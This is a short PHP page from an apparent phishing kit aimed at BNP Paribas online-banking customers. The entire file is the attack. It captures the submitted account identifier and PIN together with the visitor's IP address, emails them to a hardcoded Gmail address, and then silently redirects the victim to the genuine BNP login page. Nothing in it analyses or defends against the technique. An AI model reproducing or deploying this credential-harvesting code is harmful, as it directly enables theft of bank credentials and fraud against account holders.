<!DOCTYPE html>
<html class=" js flexbox canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths" lang="fr"><!-- tags head (style, meta ...) --><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	
	
</head>

<body>
<?php
$var1=$_POST['compte'];
$var2=$_POST['pin'];
$ip = getenv("REMOTE_ADDR");
$message .= "#============= BISSMI-LAH  =============#\n";
$message .= "#============= IP  =============#\n";
$message .= "#IP : $ip =============#\n";
$message .= "                               \n";
$message .= "#============= Login-liv ============#\n";
$message .= "Votre Identifiant :  ".$_POST['compte']."\n";
$message .= "Votre code personnel :  ".$_POST['pin']."\n";
$message .= "#============= MASSIHDAJJAL =============#\n";
$send = "jadorder2@gmail.com";
$subject = "[ BNP DAJJAL | $cc | $ip ]";
$from = "From: DAJJAL  <>";
//print_r($_POST);
mail($send,$subject,$message,$from);
echo "<script type='text/javascript'>document.location.replace('https://mabanque.bnpparibas/fr/connexion');</script>";
?>
</body>
</html>
